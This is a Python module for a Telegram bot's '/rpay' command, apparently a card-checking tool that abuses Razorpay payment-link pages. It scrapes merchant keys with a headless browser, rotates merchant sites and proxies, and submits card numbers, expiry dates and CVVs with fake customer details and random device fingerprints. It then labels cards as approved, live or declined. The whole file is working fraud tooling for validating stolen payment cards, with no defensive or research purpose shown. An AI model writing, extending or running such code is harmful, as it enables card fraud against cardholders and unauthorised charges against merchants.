# ============================================================
#  RPay Checker — Razorpay Charge Gate
#  /rpay command in Telegram bot
#  Requires: playwright (pip install playwright && playwright install chromium)
# ============================================================

import requests
import json
import time
import random
import re
import os
import string
import threading
from urllib.parse import urlencode, urlparse, parse_qs

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rpay_sites.txt")
CACHE_FILE = os.path.join(DATA_DIR, "rpay_cache.json")

_session_lock = threading.Lock()
_site_index = 0
_site_lock = threading.Lock()

# Cached site configs: {site_url: {kh, kid, plid, ppiid, stoken, cached_at, token_uses}}
_site_cache = {}


def _device_fp():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(128))


DEVICE_FINGERPRINT = _device_fp()


def load_rpay_sites():
    if not os.path.exists(SITES_FILE):
        return []
    with open(SITES_FILE, 'r') as f:
        return [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]


def save_rpay_sites(sites):
    with open(SITES_FILE, 'w') as f:
        for s in sites:
            f.write(s + '\n')


def get_next_rpay_site():
    global _site_index
    sites = load_rpay_sites()
    if not sites:
        return None
    with _site_lock:
        site = sites[_site_index % len(sites)]
        _site_index += 1
    return site


def _save_cache():
    os.makedirs(DATA_DIR, exist_ok=True)
    serializable = {}
    for k, v in _site_cache.items():
        serializable[k] = {kk: vv for kk, vv in v.items() if kk != 'lock'}
    with open(CACHE_FILE, 'w') as f:
        json.dump(serializable, f, indent=2)


def _load_cache():
    global _site_cache
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, 'r') as f:
                _site_cache = json.load(f)
        except Exception:
            _site_cache = {}


_load_cache()


def _get_session_token(proxy_config=None):
    try:
        import platform
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(headless=True, proxy=proxy_config, args=args)
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
            })
            page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
            browser.close()
            return token, None
    except Exception as e:
        return None, f"Session token error: {str(e)[:80]}"


def _extract_merchant(site_url, proxy_config=None):
    try:
        import platform
        from playwright.sync_api import sync_playwright

        merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)

        with sync_playwright() as p:
            args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(headless=True, proxy=proxy_config, args=args)
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
            })

            intercepted = {}
            def on_resp(r):
                if "api.razorpay.com/v1/payment_links/merchant" in r.url:
                    try:
                        intercepted['data'] = r.json()
                    except Exception:
                        pass

            page.on("response", on_resp)
            page.goto(site_url, timeout=45000, wait_until='networkidle')
            page.wait_for_timeout(3000)

            eval_data = page.evaluate("""() => {
                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__ || window.razorpayData;
                if (d && d.keyless_header) return d;
                for (let k in window) {
                    try { if (window[k] && typeof window[k] === 'object' && window[k].keyless_header) return window[k]; } catch(e) {}
                }
                const scripts = document.querySelectorAll('script');
                for (let s of scripts) {
                    const txt = s.textContent || s.innerText;
                    if (txt.includes('keyless_header') || txt.includes('payment_link')) {
                        const matches = txt.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
                        if (matches) {
                            for (let match of matches) {
                                try { const parsed = JSON.parse(match); if (parsed.keyless_header || parsed.key_id) return parsed; } catch (e) {}
                            }
                        }
                    }
                }
                return null;
            }""")
            browser.close()

            final = eval_data or intercepted.get('data')
            if final:
                kh = final.get('keyless_header')
                kid = final.get('key_id')
                pl = final.get('payment_link') or final
                if isinstance(pl, str):
                    try: pl = json.loads(pl)
                    except: pass
                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')
                if kh and kid and plid and ppi:
                    return kh, kid, plid, ppi, None

            # API fallback
            if merchant_match:
                try:
                    api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_match.group(1)}"
                    r = requests.get(api_url, timeout=10)
                    if r.status_code == 200:
                        d = r.json()
                        kh = d.get('keyless_header')
                        kid = d.get('key_id')
                        plid = d.get('id')
                        ppi = d.get('payment_page_items', [{}])[0].get('id')
                        if kh and kid and plid and ppi:
                            return kh, kid, plid, ppi, None
                except Exception:
                    pass

            return None, None, None, None, "Extraction failed"
    except ImportError:
        return None, None, None, None, "Playwright not installed"
    except Exception as e:
        return None, None, None, None, f"Error: {str(e)[:80]}"


def setup_site(site_url):
    """Extract merchant data and cache it. Returns (success, detail)."""
    kh, kid, plid, ppiid, err = _extract_merchant(site_url)
    if err:
        return False, err

    stoken, terr = _get_session_token()
    if terr:
        return False, terr

    _site_cache[site_url] = {
        "kh": kh, "kid": kid, "plid": plid, "ppiid": ppiid,
        "stoken": stoken, "cached_at": time.time(), "token_uses": 0,
    }
    _save_cache()
    return True, "Site configured"


def _get_site_config(site_url):
    """Get cached config for site, refresh token if needed."""
    cfg = _site_cache.get(site_url)
    if not cfg:
        ok, detail = setup_site(site_url)
        if not ok:
            return None, detail
        cfg = _site_cache.get(site_url)

    # Refresh session token every 15 uses
    cfg["token_uses"] = cfg.get("token_uses", 0) + 1
    if cfg["token_uses"] > 15:
        new_token, err = _get_session_token()
        if new_token:
            cfg["stoken"] = new_token
            cfg["token_uses"] = 0
            _save_cache()

    return cfg, None


def _random_user():
    return {
        "name": "Test User",
        "email": f"testuser{random.randint(100, 999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}"
    }


def _create_order(session, plid, amount_paise, ppiid):
    url = f"https://api.razorpay.com/v1/payment_pages/{plid}/order"
    payload = {
        "notes": {"comment": ""},
        "line_items": [{"payment_page_item_id": ppiid, "amount": amount_paise}]
    }
    try:
        r = session.post(url, headers={"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, json=payload, timeout=15)
        r.raise_for_status()
        return r.json().get("order", {}).get("id")
    except Exception:
        return None


def _submit_payment(session, order_id, card_info, user_info, amount_paise, kid, kh, plid, stoken, site_url):
    num, mm, yy, cvv = card_info
    data = {
        "notes[comment]": "", "payment_link_id": plid, "key_id": kid,
        "contact": f"+91{user_info['phone']}", "email": user_info["email"],
        "currency": "INR", "_[library]": "checkoutjs", "_[platform]": "browser",
        "_[referer]": site_url, "amount": amount_paise, "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT,
        "method": "card", "card[number]": num, "card[cvv]": cvv,
        "card[name]": user_info["name"], "card[expiry_month]": mm,
        "card[expiry_year]": yy, "save": "0"
    }
    params = {"key_id": kid, "session_token": stoken, "keyless_header": kh}
    headers = {"x-session-token": stoken, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
    return session.post("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax",
                        headers=headers, params=params, data=urlencode(data), timeout=20)


def _check_status(pid, kid, stoken, kh):
    headers = {
        'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-session-token': stoken,
    }
    params = {'key_id': kid, 'session_token': stoken, 'keyless_header': kh}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{pid}', params=params, headers=headers, timeout=15)
        if r.status_code == 200:
            d = r.json()
            return d.get('status', 'unknown'), d
        return 'unknown', {}
    except Exception:
        return 'unknown', {}


def _cancel_payment(pid, kid, stoken, kh):
    headers = {
        'Content-type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-session-token': stoken,
    }
    params = {'key_id': kid, 'session_token': stoken, 'keyless_header': kh}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{pid}/cancel', params=params, headers=headers, timeout=15)
        return r.json()
    except Exception:
        return {}


def _parse_decline(cancel_data):
    if isinstance(cancel_data, dict) and "error" in cancel_data:
        err = cancel_data["error"]
        if isinstance(err, dict):
            desc = err.get('description', 'Declined').replace("%s", "Card")
            reason = err.get('reason', '')
            parts = [desc]
            if reason and reason != 'unknown':
                parts.append(f"Reason: {reason}")
            return " | ".join(parts)
        return str(err)
    return "Unknown"


def check_card(cc_line, proxy_dict=None, site_url=None, amount_paise=100):
    start = time.time()

    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Declined | Invalid format"

        num, mm, yy, cvv = parts

        if not site_url:
            site_url = get_next_rpay_site()
        if not site_url:
            return "Error | No sites — add with /rpaysite"

        cfg, err = _get_site_config(site_url)
        if not cfg:
            return f"Error | {err}"

        session = requests.Session()
        if proxy_dict:
            session.proxies.update(proxy_dict)

        order_id = _create_order(session, cfg["plid"], amount_paise, cfg["ppiid"])
        if not order_id:
            return "Error | Order creation failed"

        time.sleep(random.uniform(1, 2))

        user_info = _random_user()
        resp = _submit_payment(session, order_id, (num, mm, yy, cvv), user_info,
                               amount_paise, cfg["kid"], cfg["kh"], cfg["plid"], cfg["stoken"], site_url)
        pdata = resp.json()

        pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
        if not pid and isinstance(pdata.get("payment"), dict):
            pid = pdata["payment"].get("id")

        elapsed = round(time.time() - start, 2)

        # Redirect (3DS)
        if pdata.get("redirect") == True or pdata.get("type") == "redirect":
            if pid:
                time.sleep(3)
                stat, sdata = _check_status(pid, cfg["kid"], cfg["stoken"], cfg["kh"])
                if stat in ('captured', 'authorized'):
                    return f"Approved | Charged | ID: {pid} | {elapsed}s"
                if stat == 'failed':
                    reason = sdata.get('error_description') or sdata.get('error', {}).get('description', 'Failed')
                    return f"Declined | {reason} | {elapsed}s"
                if stat == 'created':
                    return f"Approved | 3DS/OTP Required (Live) | ID: {pid} | {elapsed}s"

                cdata = _cancel_payment(pid, cfg["kid"], cfg["stoken"], cfg["kh"])
                if isinstance(cdata, dict) and "error" in cdata:
                    err_obj = cdata["error"]
                    if isinstance(err_obj, dict) and err_obj.get('reason') == 'payment_cancelled':
                        return f"Approved | 3DS/OTP Required (Live) | ID: {pid} | {elapsed}s"
                    return f"Declined | {_parse_decline(cdata)} | {elapsed}s"

            return f"Error | 3DS redirect missing (pid={pid}) | {elapsed}s"

        # Immediate success
        if "razorpay_signature" in pdata or "signature" in pdata:
            return f"Approved | Charged | ID: {pid} | {elapsed}s"

        # Error
        if "error" in pdata:
            err = pdata.get('error', {})
            if isinstance(err, dict):
                desc = err.get('description', 'Unknown').replace("%s", "Card")
                code = err.get('code', '')
                msg = f"{desc} (Code: {code})" if code else desc
                return f"Declined | {msg} | {elapsed}s"
            return f"Declined | {json.dumps(err)[:60]} | {elapsed}s"

        return f"Declined | Unknown response | {elapsed}s"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
        return "ConnError | Connection failed"
    except requests.exceptions.Timeout:
        return "ConnError | Timeout"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def validate_site(site_url):
    """Validate a razorpay site by extracting merchant data."""
    ok, detail = setup_site(site_url)
    return ok, detail


def probe_site(site_url=None):
    if not site_url:
        sites = load_rpay_sites()
        if not sites:
            return False, "No sites — add with /rpaysite"
        site_url = sites[0]
    try:
        r = requests.get(site_url, timeout=15)
        if r.status_code == 200 and ('razorpay' in r.text.lower() or 'razorpay.me' in site_url):
            return True, f"Razorpay page active"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
